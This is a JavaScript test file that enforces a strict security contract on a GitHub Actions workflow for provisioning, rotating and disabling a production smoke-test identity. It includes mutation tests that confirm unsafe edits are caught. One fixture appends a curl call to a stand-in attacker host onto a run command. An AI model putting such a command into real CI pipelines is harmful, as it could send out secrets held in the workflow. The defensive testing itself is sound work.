import assert from 'node:assert/strict';
import fs from 'node:fs';
import test from 'node:test';

const LIFECYCLE_WORKFLOW_URL = new URL(
  '../.github/workflows/manage-smoke-identity.yml',
  import.meta.url,
);
const DEPLOY_WORKFLOW_URL = new URL(
  '../.github/workflows/deploy-worker.yml',
  import.meta.url,
);
const SHARED_CONCURRENCY = /^concurrency:\n  group: hereisorder-production-\$\{\{ github\.ref \}\}\n  cancel-in-progress: false$/m;
const FAILURE_BYPASS = /continue-on-error|always\(|failure\(|\|\|\s*true|set\s+\+e/;
const CHECKOUT_ACTION = 'actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0';
const SETUP_NODE_ACTION = 'actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e';
const ACCOUNT_ID_LINE = '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}';
const PASSWORD_LINE = '          PRODUCTION_SMOKE_PASSWORD: ${{ secrets.PRODUCTION_SMOKE_PASSWORD }}';
const CONFIRMATION_LINE = '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}';
const CANONICAL_LIFECYCLE_WORKFLOW = [
  'name: Manage production smoke identity',
  '',
  'on:',
  '  workflow_dispatch:',
  '    inputs:',
  '      action:',
  '        description: Fixed lifecycle operation',
  '        required: true',
  '        type: choice',
  '        options:',
  '          - provision',
  '          - rotate',
  '          - disable',
  '      confirmation:',
  '        description: Type the exact MANAGE confirmation for the selected action',
  '        required: true',
  '        type: string',
  '',
  'permissions:',
  '  contents: read',
  '',
  'concurrency:',
  '  group: hereisorder-production-${{ github.ref }}',
  '  cancel-in-progress: false',
  '',
  'jobs:',
  '  manage:',
  '    name: Manage fixed production smoke identity',
  '    runs-on: ubuntu-latest',
  '    timeout-minutes: 10',
  '    steps:',
  '      - name: Reject a non-main ref',
  '        if: github.ref != \'refs/heads/main\'',
  '        run: exit 1',
  '',
  '      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0',
  '        with:',
  '          persist-credentials: false',
  '',
  '      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0',
  '        with:',
  '          node-version: \'22.23.1\'',
  '          cache: \'npm\'',
  '',
  '      - name: Install dependencies',
  '        run: npm ci',
  '',
  '      - name: Provision fixed smoke identity',
  '        if: inputs.action == \'provision\'',
  '        run: npm run db:manage-smoke-identity -- provision --remote',
  '        env:',
  '          CI: \'true\'',
  '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
  '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
  '          PRODUCTION_SMOKE_PASSWORD: ${{ secrets.PRODUCTION_SMOKE_PASSWORD }}',
  '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}',
  '',
  '      - name: Rotate fixed smoke identity',
  '        if: inputs.action == \'rotate\'',
  '        run: npm run db:manage-smoke-identity -- rotate --remote',
  '        env:',
  '          CI: \'true\'',
  '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
  '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
  '          PRODUCTION_SMOKE_PASSWORD: ${{ secrets.PRODUCTION_SMOKE_PASSWORD }}',
  '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}',
  '',
  '      - name: Disable fixed smoke identity',
  '        if: inputs.action == \'disable\'',
  '        run: npm run db:manage-smoke-identity -- disable --remote',
  '        env:',
  '          CI: \'true\'',
  '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
  '          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
  '          SMOKE_IDENTITY_CONFIRMATION: ${{ inputs.confirmation }}',
  '',
  '      - name: Reject an invalid lifecycle action',
  '        if: inputs.action != \'provision\' && inputs.action != \'rotate\' && inputs.action != \'disable\'',
  '        run: exit 1',
].join('\n') + '\n';

function readLifecycleWorkflow() {
  return fs.readFileSync(LIFECYCLE_WORKFLOW_URL, 'utf8');
}

function readDeployWorkflow() {
  return fs.readFileSync(DEPLOY_WORKFLOW_URL, 'utf8');
}

function leadingSpaces(line) {
  return line.match(/^ */)[0].length;
}

function indentedBlock(contents, header) {
  const lines = contents.split(/\r?\n/);
  const start = lines.indexOf(header);
  assert.notEqual(start, -1, `${header} block is required`);
  const indentation = leadingSpaces(header);
  let end = start + 1;
  while (end < lines.length) {
    const line = lines[end];
    if (line.trim() && leadingSpaces(line) <= indentation) break;
    end += 1;
  }
  return lines.slice(start + 1, end);
}

function directKeys(lines, indentation) {
  const keyPattern = new RegExp(`^ {${indentation}}([A-Za-z_][A-Za-z0-9_-]*):`);
  return lines.flatMap((line) => {
    const match = line.match(keyPattern);
    return match ? [match[1]] : [];
  });
}

function compactBlock(contents, header) {
  return indentedBlock(contents, header).filter((line) => line.trim());
}

function assertLifecycleSafety(contents) {
  assert.equal(typeof contents, 'string');

  assert.deepEqual(
    directKeys(indentedBlock(contents, 'on:'), 2),
    ['workflow_dispatch'],
    'trigger block must contain only workflow_dispatch',
  );
  assert.deepEqual(
    directKeys(indentedBlock(contents, '  workflow_dispatch:'), 4),
    ['inputs'],
    'workflow_dispatch must contain only the fixed inputs block',
  );
  assert.deepEqual(
    directKeys(indentedBlock(contents, '    inputs:'), 6),
    ['action', 'confirmation'],
    'workflow_dispatch inputs must be exactly action and confirmation',
  );
  assert.deepEqual(
    compactBlock(contents, '      action:'),
    [
      '        description: Fixed lifecycle operation',
      '        required: true',
      '        type: choice',
      '        options:',
      '          - provision',
      '          - rotate',
      '          - disable',
    ],
    'action input must be the fixed lifecycle choice',
  );
  assert.deepEqual(
    compactBlock(contents, '      confirmation:'),
    [
      '        description: Type the exact MANAGE confirmation for the selected action',
      '        required: true',
      '        type: string',
    ],
    'confirmation input must be the fixed required string',
  );

  assert.deepEqual(
    directKeys(indentedBlock(contents, 'jobs:'), 2),
    ['manage'],
    'jobs block must contain only manage',
  );
  const manageBlock = indentedBlock(contents, '  manage:');
  assert.deepEqual(
    manageBlock.filter((line) => /^    (?:name|if|runs-on|timeout-minutes):/.test(line)),
    [
      '    name: Manage fixed production smoke identity',
      '    runs-on: ubuntu-latest',
      '    timeout-minutes: 10',
    ],
    'manage job header must be exact and have no job-level if',
  );
  assert.deepEqual(
    directKeys(manageBlock, 4),
    ['name', 'runs-on', 'timeout-minutes', 'steps'],
    'manage job must contain only the fixed header and steps',
  );
  const stepsBlock = indentedBlock(contents, '    steps:');
  assert.equal(
    stepsBlock.find((line) => line.trim()),
    '      - name: Reject a non-main ref',
    'non-main rejection must be the first step',
  );
  assert.deepEqual(
    compactBlock(contents, '      - name: Reject a non-main ref'),
    [
      '        if: github.ref != \'refs/heads/main\'',
      '        run: exit 1',
    ],
    'non-main rejection step must have the exact condition and command',
  );

  const actions = [...contents.matchAll(/^\s+(?:-\s+)?uses:\s*([^\s#]+).*$/gm)]
    .map((match) => match[1]);
  assert.deepEqual(
    actions,
    [CHECKOUT_ACTION, SETUP_NODE_ACTION],
    'actions must use exact pinned revisions',
  );
  const persistedCredentials = [...contents.matchAll(/^\s+persist-credentials:\s*(\S+)\s*$/gm)]
    .map((match) => match[1]);
  assert.deepEqual(
    persistedCredentials,
    ['false'],
    'checkout must disable persisted credentials',
  );
  const nodeVersions = [...contents.matchAll(/^\s+node-version:\s*'([^']+)'\s*$/gm)]
    .map((match) => match[1]);
  assert.deepEqual(nodeVersions, ['22.23.1'], 'setup-node must use Node 22.23.1');
  const nodeCaches = [...contents.matchAll(/^\s+cache:\s*'([^']+)'\s*$/gm)]
    .map((match) => match[1]);
  assert.deepEqual(nodeCaches, ['npm'], 'setup-node must use the npm cache');

  const commands = [...contents.matchAll(/^\s+run:\s*(\S.*)$/gm)]
    .map((match) => match[1].trim());
  assert.deepEqual(
    commands,
    [
      'exit 1',
      'npm ci',
      'npm run db:manage-smoke-identity -- provision --remote',
      'npm run db:manage-smoke-identity -- rotate --remote',
      'npm run db:manage-smoke-identity -- disable --remote',
      'exit 1',
    ],
    'run commands must be exact',
  );

  const actionSteps = [
    {
      action: 'provision',
      name: 'Provision fixed smoke identity',
      password: true,
    },
    {
      action: 'rotate',
      name: 'Rotate fixed smoke identity',
      password: true,
    },
    {
      action: 'disable',
      name: 'Disable fixed smoke identity',
      password: false,
    },
  ];
  for (const { action, name, password } of actionSteps) {
    const expected = [
      `        if: inputs.action == '${action}'`,
      `        run: npm run db:manage-smoke-identity -- ${action} --remote`,
      '        env:',
      '          CI: \'true\'',
      '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
      ACCOUNT_ID_LINE,
      ...(password ? [PASSWORD_LINE] : []),
      CONFIRMATION_LINE,
    ];
    assert.deepEqual(
      compactBlock(contents, `      - name: ${name}`),
      expected,
      `${action} action step must have exact condition, command, and env`,
    );
  }

  assert.doesNotMatch(
    contents,
    /^\s+run:.*\$\{\{.*inputs/m,
    'run commands must not interpolate workflow inputs',
  );
  assert.match(contents, SHARED_CONCURRENCY, 'lifecycle must use shared non-cancelling concurrency');
  assert.equal(
    contents.split('group: hereisorder-production-${{ github.ref }}').length - 1,
    1,
    'lifecycle must declare shared concurrency exactly once',
  );
  assert.doesNotMatch(contents, FAILURE_BYPASS, 'lifecycle must not contain failure bypasses');
}

const dangerousMutations = [
  {
    name: 'adds a schedule trigger',
    expected: /trigger block must contain only workflow_dispatch/,
    mutate(contents) {
      return contents.replace(
        '        type: string\n\npermissions:',
        '        type: string\n  schedule:\n    - cron: "0 0 * * *"\n\npermissions:',
      );
    },
  },
  {
    name: 'suffixes a lifecycle command with curl',
    expected: /run commands must be exact/,
    mutate(contents) {
      return contents.replace(
        'run: npm run db:manage-smoke-identity -- provision --remote',
        'run: npm run db:manage-smoke-identity -- provision --remote && curl https://attacker.invalid',
      );
    },
  },
  {
    name: 'moves the rotate password into disable',
    expected: /rotate action step must have exact condition, command, and env/,
    mutate(contents) {
      const rotateBlock = [
        '      - name: Rotate fixed smoke identity',
        '        if: inputs.action == \'rotate\'',
        '        run: npm run db:manage-smoke-identity -- rotate --remote',
        '        env:',
        '          CI: \'true\'',
        '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
        ACCOUNT_ID_LINE,
        PASSWORD_LINE,
        CONFIRMATION_LINE,
      ].join('\n');
      const rotateWithoutPassword = [
        '      - name: Rotate fixed smoke identity',
        '        if: inputs.action == \'rotate\'',
        '        run: npm run db:manage-smoke-identity -- rotate --remote',
        '        env:',
        '          CI: \'true\'',
        '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
        ACCOUNT_ID_LINE,
        CONFIRMATION_LINE,
      ].join('\n');
      const disableBlock = [
        '      - name: Disable fixed smoke identity',
        '        if: inputs.action == \'disable\'',
        '        run: npm run db:manage-smoke-identity -- disable --remote',
        '        env:',
        '          CI: \'true\'',
        '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
        ACCOUNT_ID_LINE,
        CONFIRMATION_LINE,
      ].join('\n');
      const disableWithPassword = [
        '      - name: Disable fixed smoke identity',
        '        if: inputs.action == \'disable\'',
        '        run: npm run db:manage-smoke-identity -- disable --remote',
        '        env:',
        '          CI: \'true\'',
        '          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
        ACCOUNT_ID_LINE,
        PASSWORD_LINE,
        CONFIRMATION_LINE,
      ].join('\n');
      return contents
        .replace(rotateBlock, rotateWithoutPassword)
        .replace(disableBlock, disableWithPassword);
    },
  },
  {
    name: 'removes the disable confirmation',
    expected: /disable action step must have exact condition, command, and env/,
    mutate(contents) {
      const marker = `${ACCOUNT_ID_LINE}\n${CONFIRMATION_LINE}\n\n      - name: Reject an invalid lifecycle action`;
      return contents.replace(
        marker,
        `${ACCOUNT_ID_LINE}\n\n      - name: Reject an invalid lifecycle action`,
      );
    },
  },
  {
    name: 'adds a job-level main condition',
    expected: /manage job header must be exact and have no job-level if/,
    mutate(contents) {
      return contents.replace(
        '    name: Manage fixed production smoke identity\n    runs-on: ubuntu-latest',
        "    name: Manage fixed production smoke identity\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest",
      );
    },
  },
  {
    name: 'unpins the checkout action',
    expected: /actions must use exact pinned revisions/,
    mutate(contents) {
      return contents.replace(CHECKOUT_ACTION, 'actions/checkout@v7');
    },
  },
  {
    name: 'enables persisted checkout credentials',
    expected: /checkout must disable persisted credentials/,
    mutate(contents) {
      return contents.replace('persist-credentials: false', 'persist-credentials: true');
    },
  },
  {
    name: 'changes the Node version',
    expected: /setup-node must use Node 22\.23\.1/,
    mutate(contents) {
      return contents.replace("node-version: '22.23.1'", "node-version: '24'");
    },
  },
];

test('lifecycle workflow exactly matches the canonical safety contract', () => {
  assert.equal(readLifecycleWorkflow(), CANONICAL_LIFECYCLE_WORKFLOW);
});

test('lifecycle workflow satisfies independent semantic safety invariants', () => {
  assertLifecycleSafety(readLifecycleWorkflow());
});

test('deployment shares canonical non-cancelling repository/ref concurrency', () => {
  const workflow = readDeployWorkflow();
  assert.match(workflow, SHARED_CONCURRENCY);
  assert.doesNotMatch(workflow, /group: \$\{\{ github\.workflow \}\}/);
});

test('lifecycle workflow has no failure-bypass surface', () => {
  assert.doesNotMatch(readLifecycleWorkflow(), FAILURE_BYPASS);
});

test('semantic lifecycle contract rejects dangerous mutations by invariant', async (t) => {
  const workflow = readLifecycleWorkflow();
  for (const { name, expected, mutate } of dangerousMutations) {
    await t.test(name, () => {
      const mutated = mutate(workflow);
      assert.notEqual(mutated, workflow, 'mutation fixture must change the workflow');
      assert.throws(() => assertLifecycleSafety(mutated), expected);
    });
  }
});
